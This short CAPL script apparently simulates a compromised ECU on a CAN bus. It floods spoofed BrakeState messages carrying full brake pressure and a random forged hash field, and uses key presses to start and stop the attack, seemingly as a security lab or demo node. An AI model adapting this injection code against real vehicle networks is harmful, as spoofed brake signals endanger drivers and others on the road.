/*@!Encoding:1252*/

variables
{
  message LightState msg_LightState; // declaration of message into a variable
  message BrakeState msg_BrakeState; // declaration of message into a variable
  mstimer t;
  int tdelay=1;
}

on start
{
   write("Hello World, I am a compromised ECU.");
}

on key 'h'
{
  write("Sending manipulated CAN messages.");
  settimer(t,tdelay);
}

on key 'c'
{
  write("Stopped manipulated CAN messages.");
  cancelTimer(t);
  msg_BrakeState.BrakePressure = 0;
  output(msg_BrakeState);
}

on timer t{
  msg_BrakeState.BrakePressure = 100;
  msg_BrakeState.Hash = random(16777216);
  output(msg_BrakeState);
  settimer(t,tdelay);
}